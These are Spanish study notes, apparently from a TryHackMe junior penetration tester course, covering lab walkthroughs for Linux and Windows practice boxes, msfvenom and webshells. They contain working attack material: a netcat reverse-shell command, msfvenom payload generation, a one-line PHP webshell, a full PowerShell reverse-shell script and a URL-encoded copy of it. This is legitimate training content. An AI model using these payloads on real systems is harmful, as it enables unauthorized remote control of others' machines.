[
  {
    "title": "14. Linux Practice Box",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/14-linux-practice-box/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/14. Linux Practice Box.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Puedes iniciar sesión por SSH con:\n\n- Username: `shell`\n- Password: `TryH4ckM3!`\n\nSin embargo, deberías intentar aplicar los conocimientos adquiridos sobre webshells.\n\n-------------------------------\n\n1. Intenta subir una webshell, luego usa el comando `nc <ip_local> <puerto> -e /bin/bash` para mandar una reverse shell a un listener en tu máquina.\n\t1. Guardamos la webshell en un archivo `shell.php`.\n\t   ![[Pasted image 20251125161433.png]]\n\t2. Subimos el archivo.\n\t   ![[Pasted image 20251125161610.png]]\n\t3. Nos ponemos en escucha.\n\t   ![[Pasted image 20251125162215.png]]\n\t4. Mandamos la shell.\n\t   ![[Pasted image 20251125161949.png]]\n\t5. Recibimos la shell.\n\t   ![[Pasted image 20251125162339.png]]\n2. Navega a `/usr/share/webshells/php/php-reverse-shell.php` en Kali y cambia la IP y puerto para que coincida con un listener en tu máquina y sube la webshell al webserver.\n\t1. Copiamos la shell y la editamos.\n\t   ![[Pasted image 20251125164002.png]]\n\t2. Cambiamos lo que nos dice.\n\t   ![[Pasted image 20251125163934.png]]\n\t3. Subimos el archivo.\n\t   ![[Pasted image 20251125164050.png]]\n\t4. Nos ponemos en escucha.\n\t   ![[Pasted image 20251125164118.png]]\n\t5. Cargamos la URL y así recibimos la shell.\n\t   ![[Pasted image 20251125164229.png]]\n3. Inicia sesión en la máquina Linux a través de SSH usando las credenciales proporcionadas. Usa técnicas de la tarea 8 para experimentar con shells de netcat tanto reverse como bind.\n\t1. Iniciamos sesión con SSH.\n\t   ![[Pasted image 20251125164717.png]]\n\t2. Nos ponemos en escucha.\n\t   ![[Pasted image 20251125173336.png]]\n\t3. Ejecutamos uno de los código vistos en la tarea 8 para conseguir una reverse shell.\n\t   ![[Pasted image 20251125173614.png]]\n\t4. Recibimos la shell.\n\t   ![[Pasted image 20251125173650.png]]\n\t5. Ahora vamos a probar el comando para conseguir una bind shell.\n\t   ![[Pasted image 20251125174128.png]]\n\t6. Nos conectamos desde nuestra máquina.\n\t   ![[Pasted image 20251125174316.png]]\n\t7. Probamos la reverse shell con `nc`.\n\t   ![[Pasted image 20251125174526.png]]\n\t   ![[Pasted image 20251125174544.png]]\n\t   ![[Pasted image 20251125174631.png]]\n\t8. Probamos la bind shell con `nc`.\n\t   ![[Pasted image 20251125175118.png]]\n\t   ![[Pasted image 20251125175149.png]]\n4. Practica reverse y bind shells usando Socat en la máquina Linux. Prueba técnicas normales y especiales.\n\t1. Empezamos con la bind con técnica normal poniéndonos en escucha.\n\t   ![[Pasted image 20251125175722.png]]\n\t2. Nos conectamos a la bind shell desde la atacante.\n\t   ![[Pasted image 20251125175901.png]]\n\t3. Seguimos con la reverse shell de técnica normal. Lanzamos un listener en la máquina atacante.\n\t   ![[Pasted image 20251125180053.png]]\n\t4. Lanzamos la reverse shell desde el objetivo.\n\t   ![[Pasted image 20251125181012.png]]\n\t5. Recibimos la shell.\n\t   ![[Pasted image 20251125181040.png]]\n\t6. Vamos ahora con la técnica especial. Primero configuramos el listener especial.\n\t   ![[Pasted image 20251125181656.png]]\n\t7. Ejecutamos la reverse shell.\n\t   ![[Pasted image 20251125181958.png]]\n\t8. Recibimos la shell.\n\t   ![[Pasted image 20251125182023.png]]\n5. Échale un vistazo a [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). Intenta analizarlas y ver por qué funcionan.",
    "modified": "2025-11-26T00:50:43"
  },
  {
    "title": "13. Practice and Examples",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/13-practice-and-examples/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/13. Practice and Examples.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Esta unidad ha sido muy densa en cuanto a conocimientos e información y tuvimos pocas oportunidades de poner en práctica los conocimientos adquiridos. Las siguientes dos tareas contienen dos máquinas virtuales (una Ubuntu 18.04 Server y otra Windows Server). Cada una configurada con un webserver sencillo donde puedes subir y activar shells. Como es un entorno preparado para ello, no habrá filtros que sobrepasar.\n\nSe te darán credenciales e instrucciones para cada una. Deberías ntentar logueartet para practicar con netcat, socat o shells meterpreter.",
    "modified": "2025-11-26T00:50:43"
  },
  {
    "title": "9. msfvenom",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/9-msfvenom/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/9. msfvenom.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Msfvenom: La tienda única para todo lo relacionado con payloads.\n\nParte del framework de Metasploit, msfvenom se usa para generar código para reverse y bind shells. Se usa extensivamente en el desarrollo de exploits a bajo nivel (cercano a lenguaje máquina, no \"fácil\") para generar código shell hexadecimal al desarrollar un exploit como un buffer overflow. Sin embargo, también puede usarse para generar payloads en varios formatos (`.exe`, `.aspx`, `.py`, `.war`, etc.).\n\nLa sintaxis estándar es:\n\n`msfvenom -p <payload> <opciones>`\n\nPor ejemplo, para generar una reverse shell x64 de Windows en formato `.exe`, usamos:\n\n`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<ip_escucha> LPORT=<puerto_escucha>`\n\n![[Pasted image 20251125112430.png]]\n\n- `-f`: Especifica el formato.\n- `-o`: Especifica el nombre/ruta del proyecto final.\n- `LHOST`: Especifica la dirección IP de la máquina del atacante (reverse shell).\n- `LPORT`: Especifica el puerto en escucha de la máquina del atacante.\n\n-------------------------------------------\n<h2>Staged vs Stageless</h2>\nAntes de ir más allá, hay otros dos conceptos que debemos introducir: payloads de reverse shells **staged** y payloads de reverse shell **stageless**.\n\n- **Staged:** Los payloads staged **se mandan en dos partes**. La primera parte se llama stager. Es una pieza de código que se ejecuta directamente en la máquina atacada. Se conecta al listener que espera pero no contiene código de reverse shell, sino que se conecta al listener y usa la conexión para cargar el payload real. De esta manera evita ser cargada en disco, donde podría ser detectada por anti-virus convencionales. Este tipo de payloads suele requerir un listener especial, como `multi/handler` de Metasploit.\n- **Stageless:** los payloads stageless **se mandan en una sola parte**. Son más comunes, y los que hemos estado usando hasta el momento. En cuanto lo ejecutamos se manda una shell de vuelta al listener.\n\nLos payloads stageless tienden a ser más fáciles de usar y capturar. Sin embargo, también son más grandes y más fácil para un antivirus detectarlos. Aunque tradicionalmente los payloads staged tenían ventaja frente a los stageless por se menos detectables, los antivirus modernos comprueban la cargada en memoria por lo que estos han perdido valor.\n\n--------------------------------------------\n<h2>Meterpreter</h2>\nHablando de Metasploit, hay otra cosa importante de la que hablar, la Meterpreter shell. Estas son las consolas propias, con amplias funcionalidades integradas de Metasploit. Son completamente estables, haciéndolas una muy buena opción para trabajar con objetivos Windows. Si queremos usar alguna de las herramientas post-explotación de Metasploit necesitamos una shell Meterpreter. El único \"pero\" de estas shells es que necesitan ser capturadas en Metasploit.\n\n-----------------------------------------------\n<h2>Convenciones de Nombramiento de Payloads</h2>\nAl trabajar con msfvenom, es importante entender cómo funciona el sistema de nombramiento.\n\nLa convención básica es:\n\n`<OS>/<arch>/<payload>`\n\nPor ejemplo:\n\n`linux/x86/shell_reverse_tcp`\n\nEsto generaria una reverse shell para un objetivo Linux x86.\n\nLa excepción a esta convención es Windows de 32 bits, para los cuales no se especifica la arquitectura:\n\n`windows/shell_reverse_tcp`\n\nDesglosemos ahora un poco la parte del payload. \n\nEn los ejemplos de arriba hemos usado `shell_reverse_tcp`. Esto indica que es un payload **stageless**. Estos se denotan con `_`. Si quisiéramos denotar un payload staged, sería:\n\n`shell/reverse_tcp`\n\nTodos los payloads staged se denotan con `/`.\n\n----------------------------------------------\nA parte de la página de manual de `msfconsole`, lo más importante de saber cuando trabajamos con msfvenom es:\n\n`msfvenom --list payloads`\n\nEsto puede usarse para listar todos los payloads disponibles, que pueden ser pipeados a `grep` para buscar un set de payloads específicos.\n\nPor ejemplo:\n\n![[Pasted image 20251125120730.png]]",
    "modified": "2025-11-26T00:50:43"
  },
  {
    "title": "15. Windows Practice Box",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/15-windows-practice-box/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/15. Windows Practice Box.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "1. Prueba a activar la `php-reverse-shell`. ¿Funciona?\n\t1. Subimos la shell.\n\t   ![[Pasted image 20251125195020.png]]\n\t2. Nos ponemos en escucha.\n\t   ![[Pasted image 20251125195258.png]]\n\t3. Activamos la shell y esperamos la conexión.\n\t   ![[Pasted image 20251125195423.png]]\n\t   **No se puede.**\n2. Sube una webshell y obtén una reverse shell usando Powershell.\n\t1. Subimos la shell.\n\t   ![[Pasted image 20251125195633.png]]\n\t2. Nos ponemos en escucha.\n\t   ![[Pasted image 20251125195258.png]]\n\t3. Cargamos la shell y le metemos el comando que vimos en la tarea 11.\n\t   ![[Pasted image 20251125195844.png]]\n\t4. Esperamos la conexión.\n\t   ![[Pasted image 20251125200010.png]]\n3. El servidor web está corriendo con permisos SYSTEM. Crea un nuevo usuario y añádelo al grupo \"administrators\", luego inicia sesión por RDP o WinRM.\n\t1. Añadimos el usuario nuevo y lo metemos al grupo de administradores.\n\t   ![[Pasted image 20251125200148.png]]\n\t2. Inicio sesión con RDP.\n\t   ![[Pasted image 20251125200457.png]]\n4. Experimenta usando socat y netcat para obtener reverse y bind shells en el objetivo Windows.\n\t1. Netcat reverse shell.\n\t   ![[Pasted image 20251125211653.png]]\n\t2. Vamos a probar socat.\n\t   ![[Pasted image 20251125211713.png]]\n\t   Tampoco va, pero podíamos subir un socat en binario precompilado.\n\t3. Vamos a subirlo.\n\t   ![[Pasted image 20251125212356.png]]\n\t4. Ya lo tenemos en la máquina.\n\t   ![[Pasted image 20251125212702.png]]\n\t5. No nos deja.\n\t   ![[Pasted image 20251125213058.png]]\n\t6. Puede que tengamos que iniciar sesión como administrador.\n\t   No era eso.\n\t7. Vamos a subir el siguiente archivo y lo llamaremos `reverse.ps1`:\n\t   \n\t    ```powershell\n$client = New-Object System.Net.Sockets.TCPClient('<IP>', <PUERTO>);\n$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\n$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);\n$sendback = (iex $data 2>&1 | Out-String );\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$stream.Write($sendbyte,0,$sendbyte.Length);\n$stream.Flush();\n};\n$client.Close();\n```  \n\t   \n\t    ![[Pasted image 20251125214017.png]]\n5. Crea una shell Meterpreter Windows 64 bits usando msfvenom y súbelo al objetivo. Activa la shell y captúrala con el multi/handler.\n\t1. \n6. Crea una shell Meterpreter staged y uno stageless. Intenta capturarlas con netcat. ¿Funciona?",
    "modified": "2025-11-26T00:50:43"
  },
  {
    "title": "11. Webshells",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/11-webshells/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/11. Webshells.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Hay momentos en los que nos encontramos con sitios web que nos dan la oportunidad de subir, de una forma u otra, un archivo ejecutable. Idealmente, usaríamos esta oportunidad para subir código que activase una reverse o bind shell, pero a veces no es posible. En estos casos, podríamos subir en su lugar una webshell. \n\n\"Webshell\" es un término coloquial para un script que corre dentro de un servidor (normalmente en PHP o ASP) que ejecuta código en el servidor. Los comandos se introducen en la web, ya sea a través de HTML (como un formulario) o directamente en parámetros de la URL.\n\nPHP sigue siendo el lenguaje de scripting más común del lado del servidor. Veamos un poco de código simple.\n\n`<?php echo \"<pre>\" . shell_exec($_GET[\"cmd\"]) . \"</pre>\"; ?>`\n\nEsto, tomará el parámetro GET en la URL y lo ejecutará en el sistema con `shell_exec()`. Lo que significa que cualquier cosa que metamos en la URL después de `cmd=`, se ejecutará en el servidor. Los elementos `<pre>` son sólo para asegurarnos de que se formatea correctamente en en la página.\n\n![[Pasted image 20251125130855.png]]\n\nHay una gran variedad de webshells disponibles en Kali en `/usr/share/webshells`.\n\n>[!IMPORTANT] La mayoría de webshells escritas en PHP se escriben para sistemas Unix, por lo que no funcionarán en Windows.\n\nPara obtener RCE en un objetivo Windows, con el ejemplo anterior, podemos usar:\n\n`powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`\n\nEs la misma que la de la tarea 8, solo que URL-encodeada.\n\n>[!CAUTION] Recuerda cambiar la IP y el puerto.",
    "modified": "2025-11-26T00:50:43"
  }
]